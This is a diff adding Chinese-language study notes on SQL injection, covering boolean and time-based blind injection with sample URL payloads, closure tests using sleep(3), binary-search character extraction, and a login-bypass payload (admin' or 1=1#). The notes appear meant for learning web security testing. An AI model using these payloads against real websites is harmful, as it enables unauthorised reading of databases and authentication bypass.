@@ -144,6 +144,39 @@ if(a,b,c)：若a为真，则执行b，反之则执行c
 示例：
 
 ?id=1' and if(ascii(substr((select database()),1,1))>=100,sleep(1),sleep(3)) --+
+
+# 盲注
+## 布尔盲注
+使用情况：无回显，无报错，但是页面有真假值
+
+示例：
+
+?id=1' and ascii(substr((select database()),1,1))>=100
+
+使用二分法进行测试（先查看是否大于一百，若是，再查看是否大于120，若不是，则查看是否大于110，以此类推）
+
+## 时间盲注
+
+使用i情况：页面无回显，无报错，无真假值，可以尝试使用时间盲注
+
+使用函数;
+
+ sleep(3) - 让系统沉睡三秒钟
+
+ if(a,b,c) - 若a为真，则执行b，反之执行c
+
+注入前测试：
+
+?id=1 and sleep(3) 若为数字型闭合则沉睡3秒                         
+
+?id=1' and sleep(3) 若为单引号闭合则沉睡3秒
+
+可以通过页面响应跳转时间或打开开发者工具网络选项查看是否延迟
+
+示例：
+
+?id=1' and if(ascii(substr((select database()),1,1))>=100,sleep(1),sleep(3)) --+
+
 # POST提交注入
 
 username:admin' or 1=1#
